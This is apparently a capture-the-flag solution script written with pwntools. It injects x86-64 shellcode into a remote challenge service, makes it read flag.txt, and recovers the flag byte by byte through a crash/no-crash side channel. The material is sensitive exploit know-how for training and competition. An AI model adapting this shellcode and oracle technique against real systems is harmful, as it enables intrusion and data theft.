#!/usr/bin/env python3
from pwn import *
import time, sys, statistics, socket

context.arch = 'amd64'
# context.log_level = 'debug'

ASM = r"""
    /* (your ASM goes here; same as before) */
    xor     rax, rax
    push    rax
    mov     rax, 0x7478742e67616c66   ; //"flag.txt"
    push    rax

    mov     rax, 257
    mov     edi, -100
    mov     rsi, rsp
    xor     edx, edx
    syscall
    cmp     rax, 0
    js      fail
    mov     r12, rax

    sub     rsp, 0x122
    mov     r8, rsp
    lea     r9, [r8 + 0x100]

    mov     rdi, r12
    mov     rsi, r8
    xor     rax, rax
    mov     rdx, 0x100
    syscall
    cmp     rax, 0
    jle     fail
    mov     r13, rax

    mov     rax, 3
    mov     rdi, r12
    syscall

read_attempt:
    xor     rax, rax
    xor     rdi, rdi
    mov     rsi, r9
    mov     rdx, 1
    syscall
    cmp     rax, 1
    jne     fail
    
    xor r10, r10
    movzx   r10d, BYTE PTR [r9]
    cmp     r10, r13
    jae     read_attempt

    xor     rax, rax
    xor     rdi, rdi
    lea     rsi, [r9 + 1]
    mov     rdx, 1
    syscall
    cmp     rax, 1
    jne     fail

    mov     bl, byte [r9]
    mov     al, byte [r8 + r10 -1]
    cmp     al, bl
    je      success
    jmp     read_attempt

fail:
    mov     rax, 60
    mov     rdi, 1
    syscall

success:
    mov     rax, 60
    xor     rdi, rdi
    syscall
"""


def build_payload():
    # assemble ASM (user will populate ASM string)
    sc = asm(ASM)
    if len(sc) == 0:
        log.warning("ASM is empty — payload will be NOPs. Replace ASM with your code.")
    if len(sc) > 256:
        log.warning(f"shellcode length {len(sc)} > {256} bytes (no truncation performed)")
    info(f"payload with {len(sc)}")
    return sc.ljust(256, b'\x90')

# r = process()
# r = gdb.debug("./mute", gdbscript=""" 
#     break *main+454 
#     c 
# """)


payload = build_payload()

# r.recvuntil(b"BOX BOX:")
# r.send(payload)
# r.send(b"\x00S")
# r.interactive()

"""
Draf Connect
"""
flag = b""

def getcon():
    return remote("challenge.stdio.2600.in.th", 30730)
    # return process("./mute")
    # return gdb.debug("./mute", gdbscript=""" 
    # break *main+454 
    # c 
    # """)
flag = ""
while True:
    for idx in range(40):
        found = False

        r = getcon()
        r.recvuntil(b"BOX BOX:")
        r.send(payload)

        for guess in range(256):
            print(f"Trying {flag}{chr(guess)}#{idx}")
            # guess = ord('S')
            tmp = bytes([idx, guess])
            r.send(tmp)
            try:
                data = r.recv(1, timeout=0.1)
                # print(data)
            except EOFError:
                found = True
                flag += chr(guess)
                # r.interactive()
                break
            except Exception:
                r.interactive()
            # data = r.recv(1, timeout=0.1)
            # print(data)
            

        # time.sleep(0.01)
print(flag)